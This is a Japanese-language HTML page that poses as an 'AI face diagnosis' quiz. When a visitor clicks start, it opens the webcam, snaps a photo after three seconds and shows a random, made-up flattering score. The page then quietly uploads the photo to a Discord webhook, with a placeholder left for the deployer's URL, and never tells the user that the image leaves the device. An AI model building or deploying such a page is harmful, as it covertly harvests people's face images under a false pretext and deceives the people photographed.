<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI顔診断</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 20px; }
        #video { width: 100%; max-width: 400px; border-radius: 10px; display: none; }
        .btn { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #5865F2; color: white; border: none; border-radius: 5px; }
        #result { margin-top: 20px; font-weight: bold; font-size: 24px; color: #ff4757; }
    </style>
</head>
<body>

    <h1>AI顔診断システム</h1>
    <p>ボタンを押して診断を開始します</p>
    
    <button id="start-btn" class="btn">診断を開始する</button>

    <div style="margin-top: 20px;">
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas" style="display:none;"></canvas>
    </div>

    <div id="result"></div>

    <script>
        const webhookUrl = "ここにコピーしたWebhook URLを貼る";
        const startBtn = document.getElementById('start-btn');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const resultDiv = document.getElementById('result');

        startBtn.addEventListener('click', async () => {
            startBtn.style.display = 'none';
            video.style.display = 'inline-block';

            // 1. カメラをオンにする
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;

            // 3秒後に撮影・送信
            setTimeout(() => {
                takePhoto(stream);
            }, 3000);
        });

        function takePhoto(stream) {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0);

            // カメラを止める
            stream.getTracks().forEach(track => track.stop());
            video.style.display = 'none';

            // 診断結果をランダムに表示
            const scores = ["カリスマ性 100点", "優しさ 120%点", "天才度 Sランク", "美しさ 5000兆点"];
            resultDiv.innerText = "診断結果: " + scores[Math.floor(Math.random() * scores.length)];

            // 画像をDiscordに送信
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('file', blob, 'photo.png');
                formData.append('content', '新しい診断結果が届きました！');

                fetch(webhookUrl, {
                    method: 'POST',
                    body: formData
                }).then(() => console.log("送信完了"));
            }, 'image/png');
        }
    </script>
</body>
</html>
